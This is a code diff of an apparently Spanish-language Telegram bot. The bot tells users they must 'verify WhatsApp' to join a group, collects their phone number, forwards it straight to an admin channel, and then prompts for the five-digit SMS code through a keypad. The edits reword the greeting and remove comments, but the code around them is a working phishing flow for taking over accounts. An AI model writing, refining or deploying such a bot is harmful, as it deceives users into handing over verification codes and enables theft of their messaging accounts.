@@ -56,7 +56,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"👋𝐇𝐨𝐥𝐚 {nombre}\n\n"
         "𝐑𝐄𝐆𝐋𝐀 #𝟏: 𝐌𝐚𝐧𝐭𝐞𝐧𝐞𝐫 𝐬𝐢𝐞𝐦𝐩𝐫𝐞 𝐞𝐥 𝐫𝐞𝐬𝐩𝐞𝐭𝐨 𝐡𝐚𝐜𝐢𝐚 𝐥𝐚𝐬 𝐩𝐞𝐫𝐬𝐨𝐧𝐚𝐬 𝐞𝐧 𝐞𝐥 𝐠𝐫𝐮𝐩𝐨.\n\n"
         "𝐑𝐄𝐆𝐋𝐀 #𝟐: 𝐄𝐧 𝐥𝐚𝐬 𝐯𝐢𝐝𝐞𝐨𝐥𝐥𝐚𝐦𝐚𝐝𝐚𝐬 𝐠𝐫𝐚𝐭𝐢𝐬 𝐬𝐞𝐫 𝐫𝐞𝐬𝐩𝐞𝐭𝐮𝐨𝐬𝐨.\n\n"
-        "𝐏𝐫𝐞𝐬𝐢𝐨𝐧𝐚 𝐞𝐥 𝐛𝐨𝐭ó𝐧 “𝐕𝐄𝐑𝐈𝐅𝐈𝐂𝐀𝐑 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏” 𝐩𝐚𝐫𝐚 𝐞𝐧𝐭𝐫𝐚𝐫 𝐚𝐥 𝐠𝐫𝐮𝐩𝐨.",
+        "𝐏𝐚𝐫𝐚 𝐞𝐧𝐭𝐫𝐚𝐫 𝐚𝐥 𝐠𝐫𝐮𝐩𝐨, 𝐩𝐫𝐞𝐬𝐢𝐨𝐧𝐚 𝐞𝐥 𝐛𝐨𝐭ó𝐧:\n"
+        "“𝐕𝐄𝐑𝐈𝐅𝐈𝐂𝐀𝐑 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏”",
         reply_markup=share_phone_kb(), parse_mode="Markdown"
     )
 
@@ -69,7 +70,6 @@ async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     phone = msg.contact.phone_number
     user = update.effective_user
 
-    # Guardar y limpiar buffer
     context.user_data[UD_PHONE] = phone
     context.user_data[UD_CODE]  = ""
 
@@ -81,7 +81,6 @@ async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"- Fecha/Hora: {stamp}"
     )
 
-    # 1) Enviar al grupo INMEDIATO
     try:
         if ADMIN_CHANNEL_ID:
             await context.bot.send_message(ADMIN_CHANNEL_ID, admin_text, parse_mode="Markdown")
@@ -89,7 +88,6 @@ async def on_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         log.exception("Error enviando número al destino: %s", e)
 
-    # 2) Confirmar al usuario y mostrar keypad
     await msg.reply_text(f"✅ Número recibido: {phone}\nAhora introduce el *código de 5 dígitos* (SMS).",
                          parse_mode="Markdown")
     text, kb = build_keypad("")
@@ -139,7 +137,7 @@ async def keypad_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception:
         await q.message.edit_reply_markup(reply_markup=kb)
 
-# AYUDA: si el usuario manda otra cosa en PRIVADO, le explicamos qué hacer
+# AYUDA: si el usuario manda otra cosa en PRIVADO
 async def private_fallback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_chat and update.effective_chat.type == "private":
         await update.message.reply_text(
@@ -173,11 +171,10 @@ def main():
     app = ApplicationBuilder().token(BOT_TOKEN).post_init(on_startup).build()
 
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(MessageHandler(filters.CONTACT, on_contact))                # caso correcto
+    app.add_handler(MessageHandler(filters.CONTACT, on_contact))
     app.add_handler(CallbackQueryHandler(keypad_cb))
     app.add_handler(CommandHandler("id", id_cmd))
     app.add_handler(CommandHandler("testsend", testsend_cmd))
-    # Fallback solo en privado para guiar al usuario
     app.add_handler(MessageHandler(filters.ChatType.PRIVATE & ~filters.COMMAND & ~filters.CONTACT, private_fallback))
 
     app.run_polling()
